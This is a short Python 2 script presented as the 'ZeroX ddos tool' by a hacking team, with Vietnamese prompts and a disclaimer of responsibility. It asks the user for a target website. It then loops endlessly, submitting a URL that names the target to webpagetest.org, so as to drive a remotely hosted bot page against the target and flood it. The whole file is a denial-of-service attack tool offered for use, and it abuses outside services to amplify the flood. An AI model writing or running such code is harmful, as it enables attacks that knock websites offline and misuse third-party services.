#!usr/bin/python
#ZeroX ddos tool
#version: 1.0
#author:ZeroX
#===============================================#
 
import sys
import random
import mechanize
import cookielib
import socket
import httplib
 
print "############################"
print "#                          #"
print "#     ZeroX ddos tool      #"
print "#                          #"
print "############################"
print "   ######################"
print "   #                    #"
print "   #         HHT        #"
print "   # Hades Hacking Team #"
print "   #                    #"
print "   ######################"
print "[!]Minh se khong chiu trach nhiem ve nhung viec cac ban gay ra bang tool ddos nay[!]"
 
 
victim = str(raw_input("Trang web can ddos :"))
print "khi ddos nhan phim ctrl+c de thoat"
 
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
ddos = "http://www.webpagetest.org/"
 
bot = "https://5e04b3d8d5661372af21bec73be6c2d8d976b535.googledrive.com/host/0B_He0C-7D6LVX3hNdzQxUVBfdm8/botF5.html?v=%s&n=1000" % victim
 
           
print "[+] Dang bat dau tan cong vao web %s" %victim
br = mechanize.Browser()
br.set_handle_robots(False)
br.addheaders = [('User-agent', random.choice(useragents))]
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
#ddos
i = 0
d = 0
while d<1000000000000000000000000000000000000000000:
    try:
        site = br.open(ddos)
        br.select_form(name="urlEntry")
        br["url"] = bot
        br.submit()
    except KeyboardInterrupt:
        print "Bye"
        sys.exit(0)